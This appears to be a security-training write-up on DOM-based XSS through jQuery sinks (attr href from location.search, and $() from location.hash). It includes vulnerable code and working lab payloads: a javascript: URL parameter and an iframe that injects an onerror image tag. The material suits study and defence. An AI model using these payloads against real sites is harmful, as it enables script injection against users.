# DOM XSS — jQuery Sinks

## Why jQuery is Relevant

jQuery is not automatically vulnerable. The risk depends on how user-controlled input is interpreted and what the resulting value is used for. Some jQuery APIs construct selectors, some parse HTML strings, and some set attributes or DOM content.

The important question is not "Is jQuery present?" but "Does untrusted input reach a dangerous operation in a browser-executable context?"

---

## Sink 1: `attr()` + `location.search`

### How it works

`attr()` sets an HTML attribute on an element. If an attacker-controlled value is assigned to an `href`, a `javascript:` URL can become active when the user clicks the element.

**Vulnerable code:**
```javascript
$(function() {
    $('#backLink').attr('href',
        (new URLSearchParams(window.location.search)).get('returnUrl')
    );
});
```

**Data flow:**
```text
URL ?returnUrl=...   ← source
        ↓
.attr('href', ...)   ← sink
        ↓
<a href="...">Back</a>
```

### Lab: DOM XSS in jQuery href attribute sink

**Level:** Apprentice ✅ Solved

**Attack:**
```text
?returnUrl=javascript:alert(document.domain)
```

**Result:**
```html
<a href="javascript:alert(document.domain)">Back</a>
```

When the user clicks the link, the browser navigates to the `javascript:` URL and executes the script.

> Dangerous URL schemes matter. The issue is not that `attr()` is universally unsafe, but that untrusted input can be used to set a dangerous URL in a browser-executed context.

---

## Sink 2: `$()` selector + `location.hash`

### How it works

jQuery's `$()` function is commonly used to select elements, but if the string starts with HTML-like content, jQuery can parse it as HTML and create elements. This is only dangerous when the value is attacker-controlled and the resulting HTML is interpreted by the browser.

**Vulnerable code:**
```javascript
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```

**Data flow:**
```text
URL #...             ← source (location.hash)
        ↓
$(location.hash)     ← sink
        ↓
New element created in the DOM
```

### The problem: how to trigger hashchange without user interaction?

The `hashchange` event triggers when the fragment part of the URL changes. In a lab, this can be forced using an iframe or another controlled navigation pattern.

```html
<iframe
    src="https://vulnerable-site.com#"
    onload="this.src+='<img src=1 onerror=alert(1)>'"
>
```

### Lab: DOM XSS in jQuery selector sink using hashchange

**Level:** Apprentice ✅ Solved

---

## Summary

| Sink | Source | Risk condition |
|---|---|---|
| `attr('href', ...)` | `location.search` | Dangerous URL value executes when activated |
| `$()` selector | `location.hash` | HTML-like input is parsed and inserted into DOM |

---

## Key Takeaways

- `$()` is not inherently vulnerable; risk depends on the actual input and browser interpretation.
- `attr()` is not automatically unsafe; it becomes a risk when it sets a dangerous URL or browser-executable attribute value.
- The important question is the context: selector, HTML string, attribute, or URL.
- Version differences and browser quirks matter when analyzing older jQuery-based patterns.
